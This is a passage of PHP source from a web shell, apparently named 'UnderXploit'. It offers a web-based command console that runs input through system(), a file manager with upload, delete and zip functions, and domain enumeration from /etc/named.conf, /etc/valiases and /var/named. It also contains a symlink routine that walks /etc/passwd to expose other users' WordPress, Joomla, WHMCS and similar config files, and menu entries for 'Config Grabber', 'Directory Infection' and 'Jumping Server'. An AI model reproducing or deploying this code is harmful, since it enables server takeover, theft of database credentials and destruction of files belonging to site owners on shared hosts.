$ms_2 = file_get_contents("/etc/passwd");
$ms_2z = explode("\n",$ms_2);
	
	foreach($ms_2z as $ms_3) {
		$ms_1 = explode(":",$ms_3);
		$ms_4 = posix_getcwd();
		$dr = explode("/",$ms_4);

symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/wp-config.php',"pee/".$ms_1[0].'-WordPress.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/blog/wp-config.php',"pee/".$ms_1[0].'-WordPress.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/wp/wp-config.php',"pee/".$ms_1[0].'-WordPress.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/site/wp-config.php',"pee/".$ms_1[0].'-WordPress.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/config.php',"pee/".$ms_1[0].'-PhpBB.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/includes/config.php',"pee/".$ms_1[0].'-vBulletin.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/configuration.php',"pee/".$ms_1[0].'-Joomla.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/web/configuration.php',"pee/".$ms_1[0].'-Joomla.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/joomla/configuration.php',"pee/".$ms_1[0].'-Joomla.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/site/configuration.php',"pee/".$ms_1[0].'-Joomla.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/conf_global.php',"pee/".$ms_1[0].'-IPB.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/inc/config.php',"pee/".$ms_1[0].'-MyBB.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/Settings.php',"pee/".$ms_1[0].'-SMF.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/sites/default/settings.php',"pee/".$ms_1[0].'-Drupal.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/e107_config.php',"pee/".$ms_1[0].'-e107.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/datas/config.php',"pee/".$ms_1[0].'-Seditio.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/includes/configure.php',"pee/".$ms_1[0].'-osCommerce.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/client/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/clientes/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/support/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/supportes/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/whmcs/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/domain/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/hosting/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/whmc/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/billing/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/portal/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/order/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/clientarea/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt');
symlink('/'.$dr[1].'/'.$ms_1[0].'/'.$dr[3].'/domains/configuration.php',"pee/".$ms_1[0].'-WHMCS.txt'); }
break;

	case 'named.conf': switch (true) {
	case (is_readable("/etc/named.conf")):
print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">SYMLINK [ ETC/NAMED.CONF ]</td></table></div>';
print '<table class="table-file" cellspacing="0">
				<th class="th-file">Website</th>
				<th class="th-file" style="width:60px">User</th>
				<th class="th-file" style="width:60px">Action</th>';
$named = file_get_contents("/etc/named.conf");
preg_match_all('%zone \"(.*)\" {%', $named, $domains);
	foreach($domains[1] as $domain) {
		$domain = trim($domain); $i += 1;
		$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
		print "<tr><td class='td-file elip' style='padding:7px'> <span class='label-success'><i class='zmdi zmdi-globe zmdi-hc-fw'></i></span>  <a href='http://".$domain." '>".$domain."</a></td><td class='td-file'><center><font color='#1D9D73'>".$owner['name']."</font></center></td><td class='td-file'><center><a href='pee/root".$owner['dir']."/".$dr[3]."' target='_blank'>OPEN</a></center></td>";
}
print "</table><div class='coL-option' style='padding:7px;margin-top:3px'>Total Domain : <button class='lawb' style='width:60px;position:relative;top:0px'>".$i."</button></div></div>";
break;
	default: print "<tr><td class='td-file'>can't read [ /etc/named.conf ]</td></tr>";
}
break;

	case 'valiases': switch (true) {
	case (is_readable("/etc/valiases")):
print '<div class="coL-panel"><table>
<td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">SYMLINK [ ETC/VALIASES ]</td></table></div>';
print '<table class="table-file" cellspacing="0">
				<th class="th-file">Website</th>
				<th class="th-file" style="width:60px">User</th>
				<th class="th-file" style="width:60px">Action</th>';
$list = scandir("/etc/valiases");
	foreach($list as $domain) { $i += 1;
		$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
print "<tr><td class='td-file elip' style='padding:7px'> <span class='label-success'><i class='zmdi zmdi-globe zmdi-hc-fw'></i></span> <a href='http://".$domain."'>".$domain."</a></td><center><td class='td-file'><font color='#1D9D73'>".$owner['name']."</font></center></td><td class='td-file'><center><a href='pee/root".$owner['dir']."/".$dr[3]."' target='_blank'>OPEN</a></center></td>";
}
print "</table><div class='coL-option' style='padding:7px;margin-top:3px'>Total Domain : <button class='lawb' style='width:60px;position:relative;top:0px'>".$i."</button></div></div>";
break;
	default: print "<tr><td class='td-file'>can't read [ /etc/valiases ]</td></tr>"; 
}
break;

	case 'passwd':
$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);
	switch (true) {
	case (is_readable("/etc/passwd")):
print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">SYMLINK [ ETC/PASSWD ]</td></table></div>';
print '<table class="table-file">
				<th class="th-file">Website</th>
				<th class="th-file" style="width:60px">User</th>
				<th class="th-file" style="width:60px">Action</th>';
$list = scandir("/var/named");
	foreach($etcz as $etz) {
		$etcc = explode(":",$etz);
			foreach($list as $domain) {
	switch (true) { case (strpos($domain,".db")):
		$domain = str_replace('.db','',$domain);
		$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
	switch (true) { case ($owner['name'] == $etcc[0]): $i += 1;
		print "<tr><td class='td-file elip'> <span class='label-success'><i class='zmdi zmdi-globe zmdi-hc-fw'></i></span> <a href='http://".$domain." '>".$domain."</a></td>
<td class='td-file'><center><font color='#1D9D73'>".$owner['name']."</font></center></td>
<td class='td-file'><center><a href='pee/root".$owner['dir']."/".$dr[3]."' target='_blank'>OPEN</a></center></td>";
			}
		}
	}
}
print "</table><div class='coL-option' style='padding:7px;margin-top:3px'>Total Domain : <button class='lawb' style='width:60px;position:relative;top:0px'>".$i."</button></div></div>";
}
break;

	case 'var': switch (true) {
	case (is_readable("/var/named")):
print '<div class="coL-panel"><table>
<td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">SYMLINK [ VAR/NAMED ]</td></table></div>';
print '<table class="table-file">
				<th class="th-file">Website</th>
				<th class="th-file" style="width:60px">User</th>
				<th class="th-file" style="width:60px">Action</th>';
$ms_5 = scandir("/var/named");
	foreach($ms_5 as $ms_6) {
		switch (true) {
	case (strpos($ms_6,".db")): $i += 1;
		$ms_6 = str_replace('.db','',$ms_6);
		$owner = posix_getpwuid(fileowner("/etc/valiases/".$ms_6));
print "<tr><td class='td-file elip'> <span class='label-success'><i class='zmdi zmdi-globe zmdi-hc-fw'></i></span> <a href='http://".$ms_6." '>".$ms_6."</a></td>
<td class='td-file'><center><font color='#1D9D73'>".$owner['name']."</font></center></td>
<td class='td-file'><center><a href='pee/root".$owner['dir']."/".$dr[3]."' target='_blank'>OPEN</a></center></td>";
  }
}
print "</table><div class='coL-option' style='padding:7px;margin-top:3px'>Total Domain : <button class='lawb' style='width:60px;position:relative;top:0px'>".$i."</button></div></div>";
break;
	default: print "<tr><td class='td-file'>can't read [ /var/named ]</td></table>"; 
}
break;

	case 'cmd': print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">CONSOLE</td></table></div>';
	print '<div class="coL-option">';
	print '<pre style="font-family: Play;min-height:200px;font-size:14px;padding:7px" class="label-success">';
if(isset($_UNDERXPLOIT['cmd']) && $_UNDERXPLOIT['cmd']!='') {
		$exec = jmbt(system($_UNDERXPLOIT['cmd'].' 2>&1'));
switch ($exec) {
	case NULL:
	header('location: ?' . x5 . $dir);
break;
	default:
	}
}
print '</pre>
<script type="text/javascript"> function gp() {
	if(document.getElementById("csl").value == ""){'; s('Enter your command');
		print 'return false;
	} document.getElementById("egv").submit();
} </script>
<table style="margin-top:7px" cellspacing="0"><form method="POST" action="?' . x7 . 'cmd&' . x5 . $dir . '">
	<td align="center" style="width:10%"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i></td>
	<td style="width:70%;padding-left:3px;padding-right:3px"><input type="text" placeholder="$" name="cmd" id="csl"></td><td style="width:20%;text-align:right"><button type="submit" class="btn-exe" onclick="gp(); return false;"><i class="zmdi zmdi-long-arrow-return zmdi-hc-fw"></i></button></form></td>
	</table></div></div>';
break;
	
	case 'error': print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">FILE MANAGER</td></table></div>';
		bacot('Permission denied'); print x9;
break;

	default:
$ddir = @getcwd();
	if (isset($_UNDERXPLOIT['from']))
 @chdir($_UNDERXPLOIT['from']);
	$cwd = @getcwd();

switch ($os) {
	case ('win'):
		$ddir = str_replace("\\", "/", $ddir);
		$cwd = str_replace("\\", "/", $cwd);
break;
} if ($cwd[strlen($cwd) - 1] != '/') $cwd.= '/';
function hs($str) {
switch (true) {
	case (function_exists("scandir")): return scandir($str);
break;
	default: $cdm = opendir($str);
		while (false !== ($filename = readdir($cdm))) $data[] = $filename;
			return $data;
	}
}
	if (!empty($_COOKIE['target'])) $_COOKIE['target'] = @unserialize($_COOKIE['target']);
	if (!empty($_UNDERXPLOIT['hcx'])) {
switch ($_UNDERXPLOIT['hcx']) {
	case 'delete': function deleteDir($path) {
		$path = (substr($path, -1) == '/') ? $path : $path . '/';
		$cdm = opendir($path);
while (($▟ = readdir($cdm)) !== false) {
		$▟ = $path . $▟;
	if ((basename($▟) == "..") || (basename($▟) == ".")) continue;
		$type = filetype($▟);
	if ($type == "dir") deleteDir($▟); else @unlink($▟);
	}
		closedir($cdm);
		@rmdir($path);
	}

if (is_array(@$_UNDERXPLOIT['target']))
		foreach($_UNDERXPLOIT['target'] as $f) {
	if ($f == '..') continue;
			$f = urldecode($f);
	if (is_dir($f)) deleteDir($f); else @unlink($f);
	}
break;
	
	case 'paste':
		if ($_COOKIE['act'] == 'copy') {
			function copas($c, $s, $d) {
		if (is_dir($c . $s)) { mkdir($d . $s);
				$h = @opendir($c . $s);
		while (($f = @readdir($h)) !== false)
		if (($f != ".") and ($f != "..")) copas($c . $s . '/', $f, $d . $s . '/');
	} else if (is_file($c . $s)) @copy($c . $s, $d . $s);
}
	foreach($_COOKIE['target'] as $f) copas($_COOKIE['from'], $f, $GLOBALS['cwd']);
}
	elseif ($_COOKIE['act'] == 'move') {
		function mopas($c, $s, $d) {
			if (is_dir($c . $s)) { mkdir($d . $s);
				$h = @opendir($c . $s);
			while (($f = @readdir($h)) !== false)
		if (($f != ".") and ($f != "..")) copas($c . $s . '/', $f, $d . $s . '/');
	}  elseif (@is_file($c . $s)) @copy($c . $s, $d . $s);
}
	foreach($_COOKIE['target'] as $f) @rename($_COOKIE['from'] . $f, $GLOBALS['cwd'] . $f);
}
	elseif ($_COOKIE['act'] == 'zip') {
		if (class_exists('ZipArchive')) {
			$zip = new ZipArchive();
		if ($zip -> open($_UNDERXPLOIT['xpoz'], 1)) {
			chdir($_COOKIE['from']);
	foreach($_COOKIE['target'] as $f) {
		if ($f == '..') continue;
		if (@is_file($_COOKIE['from'] . $f)) $zip -> addFile($_COOKIE['from'] . $f, $f);
				elseif (@is_dir($_COOKIE['from'] . $f)) {
					$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f . '/', FilesystemIterator::SKIP_DOTS));
						foreach($iterator as $key => $value) {
							$zip -> addFile(realpath($key) , $key);
								}
							}
						}
		chdir($GLOBALS['cwd']);
			$zip -> close();
					}
				}
			}
	unset($_COOKIE['target']);
	setcookie('target', '', time() - 3600);
break;
	default:
switch (true) {
	case (!empty($_UNDERXPLOIT['hcx'])):
				vb('act', $_UNDERXPLOIT['hcx']);
				vb('target', serialize(@$_UNDERXPLOIT['target']));
				vb('from', @$_UNDERXPLOIT['from']);
			}
break;
	}
}
print '<script type="text/javascript"> function m1s() {
if(document.getElementById("act").value == "") {';
	s('Select action');
		print 'return false;
    }
    document.getElementById("sks").submit();
  }
</script>
	<form name="data" action="?dir=' . $dir . '" method="POST" style="margin:0px"><div class="coL-panel"><table>
	<td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">FILE MANAGER</td></table></div>';

$dirContent = hs(isset($_UNDERXPLOIT['from']) ? $_UNDERXPLOIT['from'] : $GLOBALS['cwd']);
switch ($dirContent) {
	case (false): print '<script type="text/javascript">c("?' . x7 . 'error&' . x5 . $dir . '");</script>';
	return;
}

global $sort;
$sort = array(
	'name',
	1
);

switch (true) {
	case (!empty($_UNDERXPLOIT['hcx'])):
		if (preg_match('!s_([A-z]+)_(\d{1})!', $_UNDERXPLOIT['hcx'], $match)) $sort = array(
		$match[1], (int)$match[2]);
}

print '<script language="JavaScript">
function grow(isChecked) {
			if(isChecked) {
				$(\'input[name="target[]"]\').each(function() { 
					this.checked = true; 
				});
			} else {
				$(\'input[name="target[]"]\').each(function() {
					this.checked = false;
				});
			}
		} </script>';
		
print '<table class="table-file" cellspacing="0">
    <th class="th-file">Name</th>
    <th class="th-file" style="width:80px" id="wh">Access</th>
    <th class="th-file" style="width:80px">Size</th>
    <th class="th-file" style="width:65px">Action</th>
    <th class="th-file"></th>
    <tr>';

$dir = getcwd();
$scn = scandir($dir);

foreach($scn as $_axu) {
	
	$dtype = filetype("$dir/$_axu");
	
switch (true) {
	case (!is_dir("$dir/$_axu")): continue 2;
break;
}

switch ($_axu) {
	case ('..'): $_axe = '<a class="a" onclick=\'c("?' . x5 . dirname($dir) . '")\'>' . $_axu . '</a>';
break;
	case ('.'): $_axe = '<a class="a" onclick=\'c("?' . x5 . $dir . '")\'>' . $_axu . '</a>';
break;
	default: $_axe = '<a class="a" onclick=\'c("?dir=' . $dir . '/' . $_axu . '")\'>' . $_axu . '</a>';
	$xdir += 1;
}
	
switch (true) {
	case($_axu == '.' || $_axu == '..'): $_axo = '--';
		$ckh = '<label><input type="checkbox" disabled><span class="icon"><i class="zmdi zmdi-check zmdi-hc-fw"></i></span></label>';
break;
	default: $_axo = '<a class="a" id="button-'.crc32($_axu).'">OPEN</a>';
		$ckh = '<label><input type="checkbox" value="' . basename($_axu) . '" name="target[]"><span class="icon"><i class="zmdi zmdi-check zmdi-hc-fw"></i></span></label>';
}
	
	print '<tr>';
	print '<td class="td-file elip"><i class="zmdi zmdi-folder-outline zmdi-hc-fw"></i>&nbsp;[ ' . $_axe . ' ]</td>';
	print '<td align="center" id="wh" class="td-file">' . perms($_axu) . '</td>';
	print '<td align="center" class="td-file"><center>--</center></th>';
	print '<td align="center" class="td-file"> ' . $_axo . '</td>';
	
	print "<div id='cr-".crc32($_axu)."' class='hidden'>
<a onclick=\"c('?" . x7 . "upload&" . x5 . $dir . "/" . $_axu . "')\"><i class='zmdi zmdi-upload zmdi-hc-fw'></i></a>
<a onclick=\"c('?" . x7 . "renadir&" . x5 . $dir . "/" . $_axu . "')\"><i class='zmdi zmdi-flip zmdi-hc-fw'></i></a>
<a onclick=\"c('?" . x7 . "chmdir&" . x5 . $dir . "/" . $_axu . "')\"><i class='zmdi zmdi-wrench zmdi-hc-fw'></i></a>
<a onclick=\"c('?" . x7 . "deledir&" . x5 . $dir . "/" . $_axu . "')\"><i class='zmdi zmdi-delete zmdi-hc-fw'></i></a>
	</div>";

	print '<td align="center" class="td-file" style="width:10px"><label for="'. $file . '">' . $ckh . '</td>';
	print "<script type='text/javascript'>
		$('#button-".crc32($_axu)."').toolbar({
			content: '#cr-".crc32($_axu)."',
			position: 'top',
			style: 'dark',
			event: 'click',
			hideOnClick: true,
			adjustment: 28
	});</script>";
}

	print '</tr>';

foreach($scn as $file) {
	$ftype = filetype("$dir/$file");
	$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
	$size = filesize("$dir/$file") / 1024;
	$size = round($size, 3);

switch (true) {
	case ($size > 1024): $size = round($size / 1024, 2) . 'MB';
break;
	default: $size = $size . 'KB';
}

switch (true) {
	case (!is_file("$dir/$file")): continue 2;
break;
}
		print '<tr>';
		print '<td class="td-file elip"><i class="zmdi zmdi-file zmdi-hc-fw"></i>&nbsp;<a class="a" onclick="c(\'?' . x7 . 'view&' . x5 . $dir . '&' . x6 . $dir . '/' . $file . '\')">';
	
	$xfile += 1;
switch ($file) {
	case (basename($_SERVER['PHP_SELF'])): $aing = '<span class="label-success">' . $file . '</font>'; 
break; 
	default: $aing = $file;
}
	
print $aing . '</label></a></td>';
print "<td align='center' class='td-file' id='wh'>".perms($dir."/".$file)."</td>";
print "<td align='center' class='td-file'>" . $size . "</td>";

print "<div id='cr-".crc32($file)."' class='hidden'>
   <a onclick=\"c('?" . x7 . "view&" . x5 . $dir . "&" . x6 . $dir . "/" . $file . "')\"><i class='zmdi zmdi-eye zmdi-hc-fw'></i></a>
   <a onclick=\"c('?" . x7 . "edit&" . x5 . $dir . "&" . x6 . $dir . "/" . $file . "')\"><i class='zmdi zmdi-edit zmdi-hc-fw'></i></a>
   <a onclick=\"c('?" . x7 . "rename&" . x5 . $dir . "&" . x6 . $dir . "/" . $file . "')\"><i class='zmdi zmdi-flip zmdi-hc-fw'></i></a>
   <a onclick=\"c('?" . x7 . "chmod&" . x5 . $dir . "&" . x6 . $dir . "/" . $file . "')\"><i class='zmdi zmdi-wrench zmdi-hc-fw'></i></a>
   <a onclick=\"c('?" . x7 . "delete&" . x5 . $dir . "&" . x6 . $dir . "/" . $file . "')\"><i class='zmdi zmdi-delete zmdi-hc-fw'></i></a>
   <a onclick=\"c('?" . x7 . "download&" . x5 . $dir . "&" . x6 . $dir . "/" . $file . "')\"><i class='zmdi zmdi-download zmdi-hc-fw'></i></a>
</div>";

print '<td align="center" class="td-file"><a class="a" id="button-'.crc32($file).'">OPEN</a></td>';
print "<td align='center' class='td-file' style='width:10px'><label><input type='checkbox' name='target[]' value='" . $file . "'><div class='icon'><i class='zmdi zmdi-check zmdi-hc-fw'></i></div></label></td>";
print "<script type='text/javascript'>
		$('#button-".crc32($file)."').toolbar({
			content: '#cr-".crc32($file)."',
			position: 'top',
			style: 'dark',
			event: 'click',
			hideOnClick: true,
			adjustment: 28
	});</script>";
}

switch (true) {
	case ($xdir == NULL): $ydir = 0;
break;
	default: $ydir = $xdir;
}

switch (true) {
	case ($xfile == NULL): $yfile = 0;
break;
	default: $yfile = $xfile;
}
	print "</table>
		<table class='table-file'>
			<td class='td-file' style='width:40px'><div style='margin-top:1px'><span class='lawb' onclick='nflo()' style='width:20px'><i class='zmdi zmdi-menu zmdi-hc-fw'></i></span></div></td>
			<td class='td-file' align='left'><div style='margin-bottom:4px'>DIRECTORY : [ <span class='label-success'>" . $ydir . "</span> ] &nbsp;&nbsp; FILE : [ <span class='label-success'>" . $yfile . "</span> ]</div></td>

</table>
		<table style='width:100%;margin-top:2px' cellspacing ='0'>";
	print "<td style='width:13%;margin-left:10px'><center><label><input type ='checkbox' id ='actchk' onClick ='grow(this.checked);'><div class='icon'><i class='zmdi zmdi-check-all zmdi-hc-fw'></i></div></label></center></td>";
	print "<input type ='hidden' name ='ne' value =''>";
    print "<input type ='hidden' name ='from' value ='" . htmlspecialchars($GLOBALS['cwd']) . "'>";
    print "<input type ='hidden' name ='charset' value ='" . (isset($_UNDERXPLOIT['charset']) ? $_UNDERXPLOIT['charset'] : '') . "'>";
	print "<td style='width:70%'>
		<select name='hcx' style='width:100%' id='act'>";
    
if (!empty($_COOKIE['act']) && @count($_COOKIE['target']))
	print "<option value ='paste'>Paste</option>";
	print "<option value =''>-- Select Action --</option>";
	print "<option value ='copy'>Copy</option>";
	print "<option value ='move'>Move</option>";
	print "<option value ='delete'>Delete</option>";

if (class_exists('ZipArchive')) 
	print "<option value ='zip'>Compress (.zip)</option>";
	print "</select></td>";

if (!empty($_COOKIE['act']) && @count($_COOKIE['target']) && (($_COOKIE['act'] == 'zip'))) 
	print "<input class='top' type='text' name='xpoz' value='" . rand(0, 100) . "-" . date("Y-m-d") . "." . ($_COOKIE['act'] == 'zip' ? 'zip' : 'tar.gz') . "' style='background:none;border:0;border-left:3px solid #1D9D73;margin-left:5px'>";
	print "<td style='width:20%;text-align:right;padding-left:3px;padding-right:2px'><button type='submit' onclick='m1s(); return false;' class='btn-exe'><i class='zmdi zmdi-long-arrow-return zmdi-hc-fw'></i></button></td></form></table>";


if (isset($_UNDERXPLOIT['ndir'])) {
	$cdir = $_UNDERXPLOIT['newinput'];
switch (true) {
	case (is_dir($dir . '/' . $cdir)): bacot('Directory already exist');
break;
	default: switch (true) {
	case (mkdir($dir . '/' . $cdir, 0777)): print '<script type="text/javascript">c("?' . x5 . $dir . '");</script>';
break;
	default: bacot('Can\'t create directory');
		}
	}
}
		
if (isset($_UNDERXPLOIT['nfil'])) {
	$cfile = $_UNDERXPLOIT['newinput'];
switch (true) {
	case (file_exists($dir . '/' . $cfile)): bacot('File already exist');
break;
	case (fopen($dir . '/' . $cfile, "w+")): print '<script type="text/javascript">c("?' . x7 . 'edit&' . x5 . $dir . '&' . x6 . $dir . '/' . $cfile . '");</script>';
break;
	default: bacot('Can\'t create file');
	}
}

print '<script language="Javascript">
		function cog(){ 
	if(document.forms[\'new\'].newinput.value === "") {';
		s('Can\'t be empty');
print 'return false; 
	}
} </script>';

print '<script type="text/javascript"> 
function valid(field) { 
        var re = /^[0-9-A-z.]*$/; 
   if(!re.test(field.value)) {';
		s('Invalid character');
print 'field.value = field.value.replace(/[^0-9-A-z.]/g,""); 
     } 
} </script>';

print '<div id="nflo" style="display:none"><table style="margin-top:3px" cellspacing="0">
			<form name="new" action="?'.x5.$dir.'" method="post">
	<td style="padding-left:2px"><input type="text" name="newinput" onkeyup="valid(this);"></td>
	<td style="padding-left:3px"><button type="submit" class="btn-exe" name="ndir" onclick="return cog();"><i class="zmdi zmdi-folder-outline zmdi-hc-fw"></i></button></td>
	<td style="padding-left:3px;padding-right:2px"><button type="submit" class="btn-exe" name="nfil" onclick="return cog();"><i class="zmdi zmdi-file-plus zmdi-hc-fw"></i></button></td>
			</form></table></div></div>';
}
print '<script type="text/javascript">
	function nflo() {
		$("#nflo").slideToggle(500);
	} </script>';
print '<div class="coR">
				<div class="coR-panel">
	<table>
			<td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">TOOLS</td>
	</table>
</div>
	<div class="tools-content">';
	
$path = getcwd();
if (isset($_FILES['data'])) {
switch (true) {
	case (copy($_FILES['data']['tmp_name'], $path . '/' . $_FILES['data']['name'])): mtr('?' . x5 . $dir);
		bacot('File uploaded succesfully');
break;
	default: bacot('Failed to upload file');
	}
}

print '<script type="text/javascript"> function upload(){
	if(document.getElementById("up").value == ""){';
				s('Enter file to upload'); print 'return false;
		} document.getElementById("%").submit();
} </script>
<table>
    <td align="center" valign="top" style="width:10%;padding-top:11px"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i></td>
    <td style="width:70%">
        <form enctype="multipart/form-data" action="?'.x5.$dir.'" method="POST"><input type="file" name="data" id="up"></td>
    <td style="width:20%" valign="top"><button type="submit" class="btn-exe" style="margin-top:1px" onclick="upload();return false;"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></form>
    </td>
</table>';
		
if (isset($_UNDERXPLOIT['x'])) {
		$rse = $_UNDERXPLOIT['file_name'];
		$zip = new ZipArchive;
switch ($_UNDERXPLOIT['file_name']) {
	case ($rse): switch (true) {
	case ($zip -> open($path . '/' . $rse) === TRUE): mtr('?' . x5 . $dir);
		$zip -> extractTo($path); $zip -> close();
		bacot('Extract successfully');
break;
	default: bacot('Permission denied');
		}
	}
}

print '<script type="text/javascript"> function unzip() {
	if(document.getElementById("u").value == ""){'; s('You must choose a zip file');
		print 'return false;
	} document.getElementById("exzip").submit();
} </script>';

print '<table><form method="POST" action="?' . x5 . $dir . '">
	<td align="center" style="width:10%"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i></td>
	<td style="width:70%"><select name="file_name" id="u">
	<option value=""> -- Extractor (.zip) --</option>';

$scandir = scandir($path);
foreach($scandir as $file) {
switch (true) {
	case (!is_file("$path/$file")): continue 2;
break;
}
switch (true) {
	case (preg_match('/\.zip$/mis', $file)): print '<option>' . $file . '</option>';
	}
}

print '</select></td><td style="width:20%;text-align:right"><button id="exzip" type="submit" name="x" class="btn-exe" onclick="unzip();return false;"><i class="zmdi zmdi-long-arrow-return zmdi-hc-fw"></i></button></form></td>
	</table>
<script type="text/javascript"> function gv() {
	if(document.getElementById("cnsl").value == ""){'; s('Enter your command');
		print 'return false;
	} document.getElementById("exc").submit();
} </script>
<table style="margin-top:15px"><form method="POST" action="?' . x7 . 'cmd&' . x5 . $dir . '">
	<td align="center" style="width:10%"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i></td>
	<td style="width:70%"><input type="text" placeholder="$" name="cmd" id="cnsl"></td><td style="width:20%;text-align:right"><button type="submit" class="btn-exe" id="exc" onclick="gv();return false;"><i class="zmdi zmdi-long-arrow-return zmdi-hc-fw"></i></button></form></td>
	</table>
</div>

<div class="coR-panel top"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">MENU</td></table></div>';
print '<div class="tools-content">';

print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-chart-donut zmdi-hc-fw"></i></td><td class="td-tools-content">System Information</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'system&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-chart-donut zmdi-hc-fw"></i></td><td class="td-tools-content">Multiple Upload</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'upload&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-chart-donut zmdi-hc-fw"></i></td><td class="td-tools-content">Directory Infection</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'infection&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-chart-donut zmdi-hc-fw"></i></td><td class="td-tools-content">Multiple Hash</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'multihash&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-chart-donut zmdi-hc-fw"></i></td><td class="td-tools-content">Jumping Server</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'jumping&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-chart-donut zmdi-hc-fw"></i></td><td class="td-tools-content">Config Grabber</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'config&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-chart-donut zmdi-hc-fw"></i></td><td class="td-tools-content">Cpanel Finder</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'cpanel&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
